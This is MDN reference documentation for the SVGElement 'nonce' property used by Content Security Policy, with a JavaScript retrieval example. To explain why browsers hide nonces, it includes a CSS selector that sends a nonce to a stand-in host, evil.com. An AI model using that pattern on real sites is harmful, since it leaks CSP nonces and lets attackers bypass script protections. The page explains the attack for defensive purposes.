---
title: "SVGElement: nonce property"
tool: "mdn-api"
version: "2026-11"
source: "https://github.com/mdn/content/blob/c44f591049bc129b356acb0a9ce281974c035113/files/en-us/web/api/svgelement/nonce/index.md"
commit: "c44f591049bc129b356acb0a9ce281974c035113"
license: "CC-BY-SA-2.5"
---

# SVGElement: nonce property

The **`nonce`** property of the `SVGElement` interface returns the nonce that is used by Content Security Policy to determine whether a given fetch will be allowed to proceed.

## Value

A String; the cryptographic nonce, or an empty string if no nonce is set.

## Examples

### Retrieving a nonce value

In the past, not all browsers supported the `nonce` IDL attribute, so a workaround is to try to use `getAttribute` as a fallback:

```js
const svg = document.querySelector("svg");
const nonce = svg.nonce || svg.getAttribute("nonce");

// Modern browsers hide the nonce attribute from getAttribute()
console.log(nonce); // Prefer using `svg.nonce`
```

However, recent browsers version hide `nonce` values that are accessed this way (an empty string will be returned). The IDL property (`svg['nonce']`) will be the only way to access nonces.

Nonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms that can grab data from content attributes like this CSS selector:

```css
svg[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## See also

- `HTMLElement.nonce` a similar method for HTML elements.
- `nonce` global attribute
- Content Security Policy
- CSP:
